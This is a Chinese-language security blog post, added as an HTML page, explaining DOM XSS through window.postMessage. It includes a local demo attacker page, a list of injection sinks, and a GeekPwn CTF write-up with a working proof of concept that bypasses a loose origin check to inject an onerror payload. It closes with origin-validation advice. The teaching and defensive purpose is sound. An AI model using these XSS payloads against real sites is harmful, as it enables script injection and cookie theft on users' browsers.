@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--
+***************  *      *     *
+      8          *    *       *
+      8          *  *         *
+      8          **           *
+      8          *  *         *
+      8          *    *       *
+      8          *      *     *
+      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
+-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+  <title>Javascript iframe postMessage xss | s1mple</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="s1mple">
+    <meta name="author" content="s1mple">
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="s1mple" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            <li>
+                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                        <li><a href="/" target="_BLANK" class="animsition-link"></a></li>
+                    
+                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link"></a></li>
+                    
+                </ul>
+            </li>
+            
+            
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/" class="animsition-link">陆队</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://st4ck.gitee.io/" class="animsition-link">书鱼</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://boluochuixue.top/" class="animsition-link">菠萝吹雪</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://rmb122.com/" class="animsition-link">rmb</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">s1mple</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            
+                            
+                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
+                            
+                            
+                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
+                            
+                            
+                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2021-01-01T08:01:27.000Z" itemprop="datePublished">
+          2021-01-01
+      </time>
+    
+</span>
+                <h1>Javascript iframe postMessage xss</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>​    我最开始发现这个有趣的点的时候，是我看到了Vinoth Kumar发掘了一个Facebook的xss；细致的看了一遍他的挖掘思路，其实是利用iframe window的postMessage进行xss；当没有验证来源的时候就可以接受任意来源的数据，攻击者相应的伪造postMessage函数就可达到篡改内容的效果；</p>
+<p>​    在读此文章前可以考虑先阅读如下几篇文章：</p>
+<p><code>https://javascript.info/cross-window-communication</code></p>
+<p><code>https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS</code></p>
+<h2 id="跨域通信的需求"><a href="#跨域通信的需求" class="headerlink" title="跨域通信的需求"></a>跨域通信的需求</h2><p>​    现代web浏览器采用一种重要的安全机制，称为同源策略（SOP），它充当从不同“源（域）”加载的web页面之间的安全边界。毋庸置疑SOP有巨大的安全防护作用，但是实际中越来越需要允许跨分布式应用程序进行安全和受控的通信；比如第三方验证、或者一些大型项目的拓展SDK，大型集成应用程序（如谷歌提供的应用程序）通过不同URL提供了广泛的应用范围等等；相比于较小的单域应用，只需要首次访问站点时发出会话cookie来跟踪用户状态信息，用户后期活动由浏览器携带cookie发起请求以提供身份验证和授权访问，大型的应用现在更多也更广泛被需要；所以跨域传输的需求日渐增多；因此为了提供无缝的用户体验，一些小的应用程序也实现了为了共享信息而采用的跨域通信技术来和一些大型网站进行整合；具体的特例就比如国外一些和Facebook、Twitter等社交网站进行整合的平台；</p>
+<p>​    之前我研究过jsonp xss；其本质也很简单直接劫持篡改掉callback就可；但是近几年jsonp xss已经很少了；并且当SameSite cookie引入之后，这种漏洞就几乎绝迹了；所以基于通信上的问题还是得看postMessage；因为有很多安全研究人员可能会忽略这一点；</p>
+<h2 id="Window-postMessage通信"><a href="#Window-postMessage通信" class="headerlink" title="Window.postMessage通信"></a>Window.postMessage通信</h2><p>​    window.postMessage方法通过提供不同来源的窗口之间通信的受控方法，帮助解决跨来源通信难题。简单地说，window.postMessage允许使用JavaScript将对象或字符串发送到另一个窗口或框架。收件人窗口可以忽略邮件，也可以使用开发人员定义的函数处理message。虽然没有另外的安全性或验证，但入站消息事件包含可用于验证发送源的“origin”属性。</p>
+<p>​    要使用postMessage，需要接收方定义一个函数来处理消息，然后使用内置的addEventListener函数将其添加为消息处理程序。发送方获取对目标窗口的引用，然后调用postMessage方法来发送消息。</p>
+<h2 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h2><p>​    要发送消息，发送页面必须首先获取对收件人窗口的引用，然后调用otherWindow.postMessage方法传递消息负载和目标源。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">otherWindow.postMessage(message, targetOrigin, [transfer]);</span><br></pre></td></tr></table></figure>
+
+<p>​    otherWindow即是其他窗口的一个引用；iframe.contentWindow属性，或者我下面例子中的window.open返回的对象；或者是window.iframes索引；只不过是不同的调用方式而已；</p>
+<p>​    例如如下的代码就可将message提交到google；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var message_target &#x3D; window.open(&#39;http:&#x2F;&#x2F;www.google.com&#39;);</span><br><span class="line">message_target.postMessage(&#39;hello message&#39;,&#39;*&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>​    还有更多的调用方式：</p>
+<h3 id="Iframe可以通过以下方式与其父级通信：引用“parent”："><a href="#Iframe可以通过以下方式与其父级通信：引用“parent”：" class="headerlink" title="Iframe可以通过以下方式与其父级通信：引用“parent”："></a>Iframe可以通过以下方式与其父级通信：引用“parent”：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parent.postMessage();</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="当和此页面中的子iframe通信时；"><a href="#当和此页面中的子iframe通信时；" class="headerlink" title="当和此页面中的子iframe通信时；"></a>当和此页面中的子iframe通信时；</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iframe.contentWindow.postMessage();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;s1mple-top.github.io&quot; name&#x3D;&#39;iframe&#39;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">var i &#x3D; window.iframe;&#x2F;&#x2F;如此容易造成 Dom clobbering从而破坏postMessage函数，三层Dom；</span><br><span class="line">i.contentWindow.postMessage(&#39;hello s1mple&#39;,&#39;*&#39;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="使用window-open打开的页面可以使用window-opener-postMessage（）将消息提交回其父页面"><a href="#使用window-open打开的页面可以使用window-opener-postMessage（）将消息提交回其父页面" class="headerlink" title="使用window.open打开的页面可以使用window.opener.postMessage（）将消息提交回其父页面:"></a>使用window.open打开的页面可以使用window.opener.postMessage（）将消息提交回其父页面:</h3><p>​    具体的测试效果如下图：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/o3vvSU"><img src="https://z3.ax1x.com/2021/11/30/o3vvSU.png" alt="o3vvSU.png"></a></p>
+<h3 id="在处理message时，收件人页面能够使用event-source-postMessage（）将message提交回发送的origin；验证效果如下："><a href="#在处理message时，收件人页面能够使用event-source-postMessage（）将message提交回发送的origin；验证效果如下：" class="headerlink" title="在处理message时，收件人页面能够使用event.source.postMessage（）将message提交回发送的origin；验证效果如下："></a>在处理message时，收件人页面能够使用event.source.postMessage（）将message提交回发送的origin；验证效果如下：</h3><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/o3vLF0"><img src="https://z3.ax1x.com/2021/11/30/o3vLF0.png" alt="o3vLF0.png"></a></p>
+<h3 id="targetOrigin："><a href="#targetOrigin：" class="headerlink" title="targetOrigin："></a>targetOrigin：</h3><p>​    这里有意思的是targetOrigin参数，这个参数规定数据发到某个域，如果不想让数据随便发送，最好不要将其设置为 <code>&#39;*&#39;</code>防止被第三方截获；上面的测试结果我为了方便直接将其设置为<code>&#39;*&#39;</code>；但是实际的操作中，最好还是将其设置为目标origin；比如在传输密码账号等敏感信息的时候，肯定不希望被其他hacker拦截；所以实际中基本都设置（但是也不能保证有漏网之鱼；</p>
+<h2 id="postMesssage-xss"><a href="#postMesssage-xss" class="headerlink" title="postMesssage xss:"></a>postMesssage xss:</h2><p>​    HTML5PostMessage以消息负载（Event.data）的形式会引入了一个新的污染源；可以看到上面的图片都发生了弹窗，所以这个模块就介绍postMessage Xss；一个基于 dom 的 xss，当 postMessage 没有正确实现（没有来源验证）时发生，并且从其他主机接收到的不受信任的数据被添加到 dom 中而没有任何过滤；这里就举一个例子，我本地写了点代码测试一下：popup一个小窗口方便测试</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;postMessage-xss-attacker&lt;/title&gt;</span><br><span class="line"> &lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;img id=<span class="string">&#x27;cookiess&#x27;</span>&gt;<span class="comment">//Dom clobbering充当cookie验证，上几个远程攻击也是如此；</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s1mple;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    s1mple = <span class="built_in">window</span>.open(<span class="string">&#x27;http://120.53.29.60:9900/demo2.html&#x27;</span>, <span class="string">&#x27;popup&#x27;</span>, <span class="string">&#x27;height=300px, width=500px&#x27;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;send();&#125;,<span class="number">2000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> msg=&#123;<span class="attr">url</span>:<span class="string">&#x27;demo2.html onload =alert(document.cookie)&#x27;</span>&#125;;</span><br><span class="line">    s1mple.postMessage(msg,<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;attack--success&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;fieldset&gt;</span><br><span class="line">            &lt;input type=<span class="string">&#x27;button&#x27;</span> id=<span class="string">&#x27;buton&#x27;</span> value=<span class="string">&#x27;xss-attack&#x27;</span> onclick=<span class="string">&#x27;attack();&#x27;</span> /&gt;</span><br><span class="line">        &lt;/fieldset&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;img name=<span class="string">&#x27;cookie&#x27;</span>&gt;</span><br><span class="line">    &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">event.origin!=<span class="string">&#x27;http://localhost:9900&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(event.origin);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(event.data.url);</span><br><span class="line">    <span class="keyword">var</span> c = event.data.url;</span><br><span class="line">   <span class="function"><span class="title">if</span>(<span class="params">c!=<span class="literal">undefined</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s1mple = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    s1mple.innerHTML = <span class="string">&quot;&lt;iframe src=&quot;</span>+c+<span class="string">&quot; id=&#x27;iframess&#x27;&gt;&lt;/iframe&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(s1mple);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;c=&#x27;</span>+event.data.url);</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    两个代码，一个攻击页；一个接受页；往往漏洞点就是因为接受页没有对源进行验证；后期改了下代码，将两个函数合二为一去掉了一个button；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/o3JxRx"><img src="https://z3.ax1x.com/2021/11/30/o3JxRx.png" alt="o3JxRx.png"></a></p>
+<p>​    这里我为了方便，我直接利用Dom clobbering原理进行全局的覆盖以仿照攻击cookie效果；这里由于接受页没有对接受的数据进行过滤，也没有对数据的origin进行判断，所以这里直接触发xss攻击；之前的几张截图是对远程的攻击载荷；</p>
+<p>​    相应的安全措施即是在数据的接收端，对于数据的origin进行一个判断，这样可以拦截一些攻击；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/o8SRF1"><img src="https://z3.ax1x.com/2021/12/01/o8SRF1.png" alt="o8SRF1.png"></a></p>
+<p>​    这次攻击就被拦截；因为origin不符合；（符合是指协议域名和端口三个都符合要求缺一不可）</p>
+<p>​    当然，上述的只是一种攻击点，其代码的效果是创建一个新的iframe然后引入src属性；直接在src的地方进行javascript伪协议Xss；那么实际情况还有很多种攻击载荷；被攻击的站点可能给我们准备好了攻击的基础；</p>
+<h3 id="攻击情况一："><a href="#攻击情况一：" class="headerlink" title="攻击情况一："></a>攻击情况一：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(&#123;attack_payload&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>​    此攻击基础就是将攻击paylaod利用document.write函数将传入的字符串写入包含任何嵌入式脚本代码的页面。利用这个函数，攻击者只需将脚本代码嵌入受污染的输入即可造成攻击；</p>
+<h3 id="攻击情况二："><a href="#攻击情况二：" class="headerlink" title="攻击情况二："></a>攻击情况二：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element.innerHTML = &#123;attack_payload&#125;</span><br><span class="line">element.outerHTML = &#123;attack_payload&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​    和一的情况差不多，具体问题具体分析了属于是，利用方式都是都是将脚本代码嵌入受污染的输入即可；</p>
+<h3 id="攻击情况三："><a href="#攻击情况三：" class="headerlink" title="攻击情况三："></a>攻击情况三：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location = &#123;attack_payload&#125;</span><br><span class="line">location.href = &#123;attack_payload&#125;</span><br><span class="line"><span class="built_in">window</span>.open(&#123;attack_payload&#125;)</span><br><span class="line">location.replace(&#123;attack_payload&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这些攻击方法和我之前的图原理差不多，利用伪协议或者利用<code>data:text/html</code>协议进行攻击载荷送达目标页面的污染；</p>
+<h3 id="攻击情况四："><a href="#攻击情况四：" class="headerlink" title="攻击情况四："></a>攻击情况四：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(&#123;attack_payload&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​    直接在jQuary的选择器中；这很明显了；直接传入攻击载荷即可进行相应的解析和攻击;</p>
+<p>​    比如svg或者iframe两者的onload属性等等；    </p>
+<h3 id="攻击情况五："><a href="#攻击情况五：" class="headerlink" title="攻击情况五："></a>攻击情况五：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​    这就更不用解释了，直接执行javascript代码了。</p>
+<h3 id="攻击情况六："><a href="#攻击情况六：" class="headerlink" title="攻击情况六："></a>攻击情况六：</h3><p>​    script标签的属性；包括src、text、textContent、innerText；第一个属性直接可引用外部js载荷；其他三个允许修改内容；利用好也可造成xss；</p>
+<h3 id="攻击情况七："><a href="#攻击情况七：" class="headerlink" title="攻击情况七："></a>攻击情况七：</h3><p>​    各种标签元素的属性；其中包括a标签的href或者iframe的src等等，都可利用来进行xss攻击；也可以利用伪协议进行xss或者在某些标签元素在强制类型转换的时候的特性，比如a标签的href、form input的value和button value或者img object value等、这不属于本文章的范围；不多交流细节；</p>
+<h2 id="国内geekpwn-postMessage-xss-umsg"><a href="#国内geekpwn-postMessage-xss-umsg" class="headerlink" title="国内geekpwn postMessage xss-umsg"></a>国内geekpwn postMessage xss-umsg</h2><p>这个xss算是比较简单的了；看下主要的代码段：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mounted: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, (<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (e.origin.match(<span class="string">&quot;http://umsg.iffi.top&quot;</span>))</span><br><span class="line">            <span class="keyword">switch</span> (e.data.action) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;append&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">void</span> (<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;main&quot;</span>)[<span class="number">0</span>].innerHTML += e.data.payload);</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;debug&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">void</span> <span class="built_in">console</span>.log(e.data.payload);</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;ping&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">void</span> e.source.postMessage(<span class="string">&quot;pong&quot;</span>, <span class="string">&quot;*&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ), !<span class="number">1</span>),</span><br><span class="line">    postMessage(&#123;</span><br><span class="line">        action: <span class="string">&quot;ping&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里可以清晰的看到，漏洞的触发是因为origin的来源验证出了问题，只用了match进行匹配，只校验域名头；所以这里我们只要找一个<code>http://umsg.iffi.top.xxx.xxx</code>来构造利用即可。就可以绕过对源的判断；相关的攻击代码也挺好写；显然是要劫持action将其value设置成append即可，就就会触发漏洞；直接上poc吧；</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;postMessage-xss-attacker&lt;/title&gt;</span><br><span class="line"> &lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s1mple;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    s1mple = <span class="built_in">window</span>.open(<span class="string">&#x27;http://120.53.29.60:9900/geekpwn-umsg.html&#x27;</span>, <span class="string">&#x27;popup&#x27;</span>, <span class="string">&#x27;height=300px, width=500px&#x27;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;send();&#125;,<span class="number">2000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> msg=&#123;<span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;append&#x27;</span>,<span class="string">&#x27;payload&#x27;</span>:<span class="string">&#x27;&lt;img src=1 onerror=alert(&quot;attack--success!&quot;)&gt;&#x27;</span>&#125;;</span><br><span class="line">    s1mple.postMessage(msg,<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;attack--success&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;fieldset&gt;</span><br><span class="line">            &lt;input type=<span class="string">&#x27;button&#x27;</span> id=<span class="string">&#x27;buton&#x27;</span> value=<span class="string">&#x27;xss-attack&#x27;</span> onclick=<span class="string">&#x27;attack();&#x27;</span> /&gt;</span><br><span class="line">        &lt;/fieldset&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/oGT2Je"><img src="https://z3.ax1x.com/2021/12/01/oGT2Je.png" alt="oGT2Je.png"></a></p>
+<p>​    这里到最后解释一下为什么attack页面的载荷需要延迟2秒后发出，我当时最开始立即发出但是显示undefined；所以我估计是因为和iframe空白页一样的原因，在最开始的时候还没有初始化完毕，都是undefined；iframe在最开始和初始化完全之后的页面引用是不同的，所以如果消息发的太快，会导致正确引用的时候value为undefined；所以这里延迟两秒；</p>
+<h2 id="postMessage-Xss防护："><a href="#postMessage-Xss防护：" class="headerlink" title="postMessage Xss防护："></a>postMessage Xss防护：</h2><p>​    合理正确的使用postMessage就可保证相应的安全性；也就是targetOrigin和origin的相互设置和验证；进一步可对接受的消息进行相应的过滤等等的措施；</p>
+<h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h3><p><code>https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage#the_dispatched_event</code></p>
+<p><code>https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.exploit-db.com/_docs_40287_pdf/index.pdf</code></p>
